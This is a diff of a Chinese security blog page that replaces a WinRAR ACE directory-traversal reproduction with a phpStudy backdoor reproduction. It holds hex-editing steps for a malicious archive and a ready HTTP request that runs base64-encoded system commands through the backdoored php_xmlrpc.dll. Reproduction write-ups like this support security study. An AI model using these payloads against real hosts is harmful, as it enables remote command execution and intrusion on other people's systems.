@@ -4,8 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="WinRAR目录穿越漏洞复现, dylan&#39;s blog">
-    <meta name="description" content="0x01 漏洞概述该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而Wi">
+    <meta name="keywords" content="phpStudy后门漏洞复现, dylan&#39;s blog">
+    <meta name="description" content="0x01 概述phpStudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，在国内有着近百万的PHP语言">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>WinRAR目录穿越漏洞复现 | dylan&#39;s blog</title>
+    <title>phpStudy后门漏洞复现 | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -273,13 +273,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        WinRAR目录穿越漏洞复现
+                        phpStudy后门漏洞复现
                     </div>
                 </div>
             </div>
@@ -390,20 +390,20 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞/" target="_blank">
-                                <span class="chip bg-color">漏洞</span>
-                            </a>
-                        
                             <a href="/tags/复现/" target="_blank">
                                 <span class="chip bg-color">复现</span>
                             </a>
                         
-                            <a href="/tags/WinRAR/" target="_blank">
-                                <span class="chip bg-color">WinRAR</span>
+                            <a href="/tags/phpstudy/" target="_blank">
+                                <span class="chip bg-color">phpstudy</span>
                             </a>
                         
-                            <a href="/tags/目录穿越/" target="_blank">
-                                <span class="chip bg-color">目录穿越</span>
+                            <a href="/tags/后门/" target="_blank">
+                                <span class="chip bg-color">后门</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/" target="_blank">
+                                <span class="chip bg-color">RCE</span>
                             </a>
                         
                     </div>
@@ -426,21 +426,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-07-26
+                    2019-09-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        570
+                        810
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        3 分
                     </div>
                     
                 
@@ -456,36 +456,42 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，<br>没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。<br>而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，<br>将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p>
-<hr>
-<h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p><strong>影响版本：</strong><br>       * WinRAR &lt; 5.70 Beta 1<br>       * Bandizip &lt; = 6.2.0.0<br>       * 好压(2345压缩) &lt; = 5.9.8.10907<br>       * 360压缩 &lt; = 4.0.0.1170<br>       * ……</p>
-<hr>
-<h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>新建一个任意文件，名称类型内容随意<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155542.png" alt></p>
-<p>使用Winace进行压缩<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155906.png" alt></p>
-<p>然后下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本<br>输入命令<code>python acefile.py --headers test.ace</code> 读取文件的头部信息<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160308.png" alt></p>
-<p>ok，开始构造恶意文件<br>用 010Editor 打开test.ace文件<br>需要修改以下参数：</p>
-<ul>
-<li>hdr_crc</li>
-<li>hdr_size</li>
-<li>filename的长度</li>
-<li>filename<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160517.png" alt><br>首先将filename的值改为 <code>d:\d:\liehu.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161040.png" alt></li>
+                <h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>phpStudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、<br>ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，<br>在国内有着近百万的PHP语言学习者、开发者用户。<br>最近杭州公安在<a href="https://mp.weixin.qq.com/s?__biz=MzA4MjM2MDgxMA==&mid=2815602999&idx=1&sn=b01cd1d8b2c50df48d4196400a3db8d9&chksm=bda0f1b28ad778a46f7cf77ec1ddf1488a063b183732735bc3808621d71765792213f8deb6fe&scene=21#wechat_redirect" target="_blank" rel="noopener">“杭州警方通报打击涉网违法犯罪暨“净网2019”专项行动战果”</a>一文中提到:</p>
+<blockquote>
+<p>Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer<br>多款软件一次性安装，无需配置即可直接安装使用，具有PHP环境调试和PHP开发功能，在国内有着近百万PHP语言学习者、开发者用户。<br>正是这样一款公益性软件，2018年12月4日，西湖区公安分局网警大队接报案称，某公司发现公司内有20余台计算机被执行危险命令，<br>疑似远程控制抓取账号密码等计算机数据 回传大量敏感信息。<br>据统计，截止抓获时间，犯罪嫌疑人共非法控制计算机67万余台，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，<br>非法牟利共计600余万元。</p>
+</blockquote>
+<p>令人震惊的同时，想想自己电脑上还下的有好几个版本的phpstudy，根据大佬的思路复现一波，踩了几个特别坑的坑。</p>
+<h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><ul>
+<li>phpStudy2016<br>  <code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br>  <code>php\php-5.4.45\ext\php_xmlrpc.dll</code></li>
+<li>phpStudy2018<br>  <code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br>  <code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161237.png" alt></p>
-<p>修改后的filename的长度，选中它，左下角就是它的长度15，16进制为00 0F，filename的前两位就是它的长度<br>修改顺序是由后到前，即将10改为0F即可<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161841.png" alt></p>
-<p>修改<strong>hdr_size</strong>，选中如下位置，左下角查看其长度，这里是（00 2E），选中的前面的红框就是hdr_size<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162147.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162439.png" alt></p>
-<p>最后修改<strong>hdr_crc</strong>，再次运行<br><code>python acefile.py --headers test.ace</code><br>CRC校验失败，报错<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162831.png" alt><br>在acefile.py文件中查找 <code>header CRC failed</code><br>在其上面一行添加输出语句，输出ace_crc16(buf)，即为我们需要的<strong>hdr_crc</strong>的值<br><code>print (ace_crc16(buf), buf)</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163206.png" alt></p>
-<p>改好保存，再次运行<br><code>python acefile.py --headers test.ace</code><br>31102即我们需要的值，转换成16进制为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163625.png" alt></p>
-<p>将<strong>hdr_size</strong> 前面的两位即为<strong>hdr_crc</strong>，从右到左修改为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164206.png" alt></p>
-<p>再次运行<br><code>python acefile.py --headers test.ace</code><br>输出如下信息无报错，就成功了，用开头所述解压工具解压test.ace，就会在红框的路径生成对应的文件。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164506.png" alt></p>
-<hr>
-<h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ol>
-<li>升级最新的WinRAR ，目前版本是 5.71 </li>
-<li>winRAR安装目录下，删除UNACEV2.dll文件</li>
-</ol>
-<hr>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/" target="_blank" rel="noopener">WinRAR漏洞复现过程</a><br><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research</a></p>
+<h1 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h1><h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>win10+phpStudy 2018(php-5.4.45+Apache)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924232920.png" alt></p>
+<h2 id="后门验证："><a href="#后门验证：" class="headerlink" title="后门验证："></a>后门验证：</h2><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p>
+<p><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></p>
+<p>存在<code>@eval(%s(&#39;%s&#39;));</code>即说明有后门。</p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924233404.png" alt></p>
+<h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><h3 id="BP抓包复现"><a href="#BP抓包复现" class="headerlink" title="BP抓包复现"></a>BP抓包复现</h3><p>直接访问首页抓包</p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924234029.png" alt></p>
+<p>在请求头里构造 <code>Accept-Encoding</code> 和 <code>accept-charset</code> 即可。</p>
+<p> <code>Accept-Encoding</code> 已经有了，但是这里注意：<br> <strong>要把<code>gzip, deflate</code>  里逗号后面的空格去掉，不然命令执行不成功。</strong></p>
+<p> <img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924235906.png" alt></p>
+<p>然后在请求头里添加 <code>accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==</code><br><code>Accept-Charset</code> 的值就是执行的命令，默认是<code>system(&#39;net user&#39;);</code><br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！</p>
+<p><strong>最后注意，要保证有请求体，只有请求头会一直卡在Waiting，最后返回超时。<br>在请求头最后，至少敲两下回车，然后留空或者随便添加点什么。</strong></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000134.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000651.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000852.png" alt></p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre><code>GET / HTTP/1.1
+Host: 192.168.1.12
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,und;q=0.5,pt;q=0.4,zh-TW;q=0.3,lb;q=0.2,fr;q=0.1,ca;q=0.1,ja;q=0.1,mt;q=0.1,de;q=0.1,vi;q=0.1,pl;q=0.1,tr;q=0.1,nb;q=0.1,es;q=0.1
+Connection: close
+Content-Length: 2
 
+</code></pre>
             </div>
             <hr/>
 
@@ -643,9 +649,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《WinRAR目录穿越漏洞复现》
+                    《phpStudy后门漏洞复现》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -944,30 +950,30 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/">
+                <a href="/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Ciuis CRM 1.6 - 'eventType' SQL Inj.复现">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="phpStudy后门漏洞复现">
                         
-                        <span class="card-title">Ciuis CRM 1.6 - 'eventType' SQL Inj.复现</span>
+                        <span class="card-title">phpStudy后门漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x01 漏洞详情===========================================================================================
-# Exploit Title: Ci
+                            0x01 概述phpStudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，在国内有着近百万的PHP语言
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -980,23 +986,24 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
-                    </a>
                     
                     <a href="/tags/复现/" target="_blank">
                         <span class="chip bg-color">复现</span>
                     </a>
                     
-                    <a href="/tags/Ciuis-CRM-1-6/" target="_blank">
-                        <span class="chip bg-color">Ciuis CRM 1.6</span>
+                    <a href="/tags/phpstudy/" target="_blank">
+                        <span class="chip bg-color">phpstudy</span>
                     </a>
                     
-                    <a href="/tags/SQL-Inj/" target="_blank">
-                        <span class="chip bg-color">SQL Inj.</span>
+                    <a href="/tags/后门/" target="_blank">
+                        <span class="chip bg-color">后门</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/" target="_blank">
+                        <span class="chip bg-color">RCE</span>
                     </a>
                     
                 </div>
@@ -1010,24 +1017,24 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/">
+                <a href="/2019/09/21/yuan-ma-da-jian-ivre/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="树洞外链X_FORWARDED_FOR注入漏洞复现">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Ubuntu16 源码搭建 IVRE">
                         
-                        <span class="card-title">树洞外链X_FORWARDED_FOR注入漏洞复现</span>
+                        <span class="card-title">Ubuntu16 源码搭建 IVRE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、漏洞概述树洞外链现在已经停止更新，作者又开发了Cloudreve，有兴趣可以了解一下。回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可
+                            0x01 前言IVRE(又名DRUNK)是一款开源的网络侦查框架工具，IVRE使用Nmap、Zmap进行主动网络探测，使用Bro、P0f等进行网络流量被动分析，探测结果存入数据库中，方便数据的查询、分类汇总统计。网上大多都是使用Docker
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-25
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-21
                             </span>
                         <span class="publish-author">
                             
@@ -1044,16 +1051,20 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/tools/" target="_blank">
+                        <span class="chip bg-color">tools</span>
                     </a>
                     
-                    <a href="/tags/复现/" target="_blank">
-                        <span class="chip bg-color">复现</span>
+                    <a href="/tags/Ubuntu16/" target="_blank">
+                        <span class="chip bg-color">Ubuntu16</span>
                     </a>
                     
-                    <a href="/tags/树洞外链/" target="_blank">
-                        <span class="chip bg-color">树洞外链</span>
+                    <a href="/tags/源码/" target="_blank">
+                        <span class="chip bg-color">源码</span>
+                    </a>
+                    
+                    <a href="/tags/IVRE/" target="_blank">
+                        <span class="chip bg-color">IVRE</span>
                     </a>
                     
                 </div>
